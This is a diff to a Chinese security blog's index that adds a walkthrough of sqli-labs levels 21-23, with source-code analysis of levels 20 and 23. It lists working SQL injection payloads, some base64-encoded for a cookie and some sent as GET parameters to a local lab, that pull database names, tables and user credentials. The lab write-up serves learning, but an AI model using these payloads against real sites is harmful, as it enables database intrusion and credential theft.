@@ -15,6 +15,34 @@
       </tags>
   </entry>
   <entry>
+    <title>sql-lab 21-30</title>
+    <url>//post%E6%B3%A8%E5%85%A52/</url>
+    <content><![CDATA[<p>要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。<br><img src="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png" alt="在这里插入图片描述"></p>
+<span id="more"></span>
+<h1 id="sql-lab-21"><a href="#sql-lab-21" class="headerlink" title="sql-lab 21"></a>sql-lab 21</h1><p>首先登录进去<br><img src="https://img-blog.csdnimg.cn/d64abe76848641e3bff186023b08cba5.png" alt="在这里插入图片描述"><br>发现coookie变成<code>uname=YWRtaW4%3D</code>，可见采用了base64编码进行转换<br>此时可采用base64位编码输出代码</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;union select 1,2,database() #</span></span><br></pre></td></tr></table></figure>
+<p>转换后为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>MCd1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgIw<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
+<p>执行后发现报错，此时想到可能unname的包裹方式不是’，此时进行逐个尝试，在尝试到’)发现回显出了正确的数据库,如图所示<br><img src="https://img-blog.csdnimg.cn/36a347ea9d1145928a84c4978f2dde6d.png" alt="在这里插入图片描述"><br>其他猜解语句也同之前一样，唯一不同的是需要将语句转换成base63编码</p>
+<h1 id="sql-lab-22"><a href="#sql-lab-22" class="headerlink" title="sql-lab 22"></a>sql-lab 22</h1><p>登录进去后<br><img src="https://img-blog.csdnimg.cn/36f3044f592a40a38329041d05e6daa5.png" alt="在这里插入图片描述"><br>发现也是以base64编码传入的uname<br>试试刚才的payload，发现报错，此时想到unname的包裹方式可能不同，开始尝试，在包裹方式为”时发现正确回显，此时查询当前数据库的payload为<code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICM=</code><br><img src="https://img-blog.csdnimg.cn/66fb0389873d43dbaee12ae9287b86ee.png" alt="在这里插入图片描述"></p>
+<h2 id="查看所有数据库"><a href="#查看所有数据库" class="headerlink" title="查看所有数据库"></a>查看所有数据库</h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM=</code><br>执行结果<br><img src="https://img-blog.csdnimg.cn/36ccffd0ef48422fb143f8291e05c756.png" alt="在这里插入图片描述"></p>
+<h2 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</code><br>执行结果<br><img src="https://img-blog.csdnimg.cn/e84ccbb1bea84385af38b7c29f26e9e8.png" alt="在这里插入图片描述"></p>
+<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</code><br><img src="https://img-blog.csdnimg.cn/a657493c6dee4099940a9dd264aea9d3.png" alt="在这里插入图片描述"></p>
+<h2 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoJ34nLGlkLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHNlY3VyaXR5LnVzZXJzIw==</code><br><img src="https://img-blog.csdnimg.cn/35cd1aaf4e3842d498781d2ce97c5b45.png" alt="在这里插入图片描述"><br>查询其他类似信息不再赘述</p>
+<h1 id="sql-lab-23"><a href="#sql-lab-23" class="headerlink" title="sql-lab 23"></a>sql-lab 23</h1><p>进入界面后发现让输入id，测试出用单引号包裹id，以get方式传入数据后，发现无法被执行<br><img src="https://img-blog.csdnimg.cn/1678e2e56e9b4d1e87504518e31d7f9c.png" alt="在这里插入图片描述"><br>此时再将注释符换成#，也无法执行，说明可能注释符在这里被进行了转换，因此此时我们可以用单引号来进行闭合语句<br>payload为<code>id=0&#39; union select 1,2,&#39;3</code>或<code>id=0&#39; union select 1,2,3 or &#39;1&#39;=&#39;1</code></p>
+<h2 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; union select 1,database(),3 or &#x27;</span><span class="number">1</span><span class="string">&#x27;= &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/d8d3080227a647e08d05d9dd2a1ce691.png" alt="在这里插入图片描述"></p>
+<h2 id="查询表名-1"><a href="#查询表名-1" class="headerlink" title="查询表名"></a>查询表名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;</span><span class="number">1</span><span class="string">&#x27;= &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/13dba26f442845a2b2030889e72d0fd6.png" alt="在这里插入图片描述"><br>此处有个我解决不了的问题，我暂时将其记录下来，如果有大佬知道原因，希望可以帮助我一下，这个问题就是当把最后的and换成or时，按理说是可以得到当前数据库的表名的，可是却得到了infromation_schema数据库的全部表名<br><img src="https://img-blog.csdnimg.cn/cfccaa7c83f341a2b9160ba4349bcd41.png" alt="在这里插入图片描述"><br>而当or语句后面的’1’=’1，换成错误语句，例如’1’=’0,此时会正确的报出当前数据库的表名<br><img src="https://img-blog.csdnimg.cn/517441cd2c6f48739c27ecd2eef980cc.png" alt="在这里插入图片描述"><br>查询其他与之前类似，在这里不再赘述。</p>
+]]></content>
+      <categories>
+        <category>post注入</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入相关知识</title>
     <url>//sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%89%A9%E5%85%85/</url>
     <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/7ccae1c16a134b4fb5e86a4d7117f496.png" alt="在这里插入图片描述"><br>看过浮生万物也遍览山河无数<br>依然要独立坚强温暖</p>
@@ -96,7 +124,9 @@ $base：转化所使用的进制。
 <h2 id="sql-lab-3-源码分析"><a href="#sql-lab-3-源码分析" class="headerlink" title="sql-lab 3 源码分析"></a>sql-lab 3 源码分析</h2><p>打开源文件<br>此关卡与上关的注入方式相同，不再重复<br><img src="https://img-blog.csdnimg.cn/07e44afcb52a4e34b6062c35d3ca48aa.png" alt="在这里插入图片描述"></p>
 <h2 id="sql-lab-4-源码分析"><a href="#sql-lab-4-源码分析" class="headerlink" title="sql-lab 4 源码分析"></a>sql-lab 4 源码分析</h2><p>打开源文件<br>此关卡与上关相同，不再重复<br>往下看<br><img src="https://img-blog.csdnimg.cn/0a7fbda29f424b619299cb0859951e22.png" alt="在这里插入图片描述"><br>发现id先是被双引号包裹<br>观察sql语句<br>发现id又被括号包裹<br>因此想要进行sql注入，需要在id后加上”)<br>对这个sql语句中id的传参进行分析，首先是对$id加上单引号，此时呢，就相当于php中输出字符，是需要加单引号才能被识别，然后加双引号是对其字符进行包裹，再加单引号，是为了防止计算机对内部内容理解错误（可能解释不是很清楚，下面放出实例）<br><img src="https://img-blog.csdnimg.cn/3cf01e6068f24b129b5103161cdba30b.png" alt="在这里插入图片描述"><br>执行结果为<br><img src="https://img-blog.csdnimg.cn/21e3a89e038d4df59afb19bb2363dc6f.png" alt="在这里插入图片描述"><br>而当没有最外层的单引号时<br><img src="https://img-blog.csdnimg.cn/c7148d185be14bbfaeb28c8357e3f15b.png" alt="在这里插入图片描述"><br>执行结果<br><img src="https://img-blog.csdnimg.cn/6c384eff744d406d9bd58f9f1dbca297.png" alt="在这里插入图片描述"></p>
 <h2 id="sql-lab-5-源码分析"><a href="#sql-lab-5-源码分析" class="headerlink" title="sql-lab 5 源码分析"></a>sql-lab 5 源码分析</h2><p>第五关与第一关的传入和sql相一致，但不同点在于，语句正确时只会输出you are in,源码见下图<br><img src="https://img-blog.csdnimg.cn/5116fb8a1efd49ea8ebaabd19a859d70.png" alt="在这里插入图片描述"><br>因此联合查询在这里不适用，可使用报错注入或者二分法来进行sql注入</p>
-<h2 id="sql-lab-6-源码分析"><a href="#sql-lab-6-源码分析" class="headerlink" title="sql-lab 6 源码分析"></a>sql-lab 6 源码分析</h2><p>id包裹方式从单引号变成了双引号，其他与第五关一致<br>sql-lab 20 源码分析<br>首先看自定义函数<br><img src="https://img-blog.csdnimg.cn/2f428eb6c7e640628054bfe0c5ea09f8.png" alt="在这里插入图片描述"><br>分析：<br>这个自定义函数是不是定义变量如果不是空的就截取0,20位，然后再继续，如果变量中含有特殊符号都进行转义，然后再删去反斜线，相当于只保留了字符串，如果不是纯数字组，就给它用单引号包裹，并将字符串里的特殊符号进行转义，否则就将字符按照进制转换输出，返回这个变量值。</p>
+<h2 id="sql-lab-6-源码分析"><a href="#sql-lab-6-源码分析" class="headerlink" title="sql-lab 6 源码分析"></a>sql-lab 6 源码分析</h2><p>id包裹方式从单引号变成了双引号，其他与第五关一致</p>
+<h2 id="sql-lab-20-源码分析"><a href="#sql-lab-20-源码分析" class="headerlink" title="sql-lab 20 源码分析"></a>sql-lab 20 源码分析</h2><p>首先看自定义函数<br><img src="https://img-blog.csdnimg.cn/2f428eb6c7e640628054bfe0c5ea09f8.png" alt="在这里插入图片描述"><br>分析：<br>这个自定义函数是不是定义变量如果不是空的就截取0,20位，然后再继续，如果变量中含有特殊符号都进行转义，然后再删去反斜线，相当于只保留了字符串，如果不是纯数字组，就给它用单引号包裹，并将字符串里的特殊符号进行转义，否则就将字符按照进制转换输出，返回这个变量值。</p>
+<h2 id="sql-lab-23-源码分析"><a href="#sql-lab-23-源码分析" class="headerlink" title="sql-lab 23 源码分析"></a>sql-lab 23 源码分析</h2><p><img src="https://img-blog.csdnimg.cn/4ec722113e714626a567528433943841.png" alt="在这里插入图片描述"><br>观察源码发现利用了preg_reolace函数，此函数可替换字符串中的某个字符，观察语句发现，将注释符–+和#进行了注释，因此我们不能够再用这两个来闭合语句<br>，看下面的sql语句，可以发现是单引号闭合，因此我们想要注入，在id后加上单引号即可，但是该如何来执行语句，此时有两种方法，一是直接利用’，二是用or ‘1’=’1，不过其实原理都一样，此时其可构造payload <code>id=0&#39; union select 1,2,&#39;3</code>或<code>id=0&#39; union select 1,2,3 or &#39;1&#39;=&#39;1</code></p>
 ]]></content>
       <categories>
         <category>post注入</category>
@@ -147,7 +177,7 @@ $base：转化所使用的进制。
       </tags>
   </entry>
   <entry>
-    <title>get注入</title>
+    <title>get注入(sql-lab 1-10)</title>
     <url>//get%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/c3438e95b2404645b41d0930512dbafe.png" alt="在这里插入图片描述"><br>你逆光而来配得上这世间所有温柔。</p>
 <span id="more"></span>
@@ -292,7 +322,7 @@ $base：转化所使用的进制。
       </tags>
   </entry>
   <entry>
-    <title>post注入</title>
+    <title>post注入(sql-lab 11-20)</title>
     <url>//post%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/45835499f36043d6a8bc794c68cfd79d.png" alt="在这里插入图片描述"><br>如果事与愿违，请一定相信是上天另有安排。</p>
 <span id="more"></span>
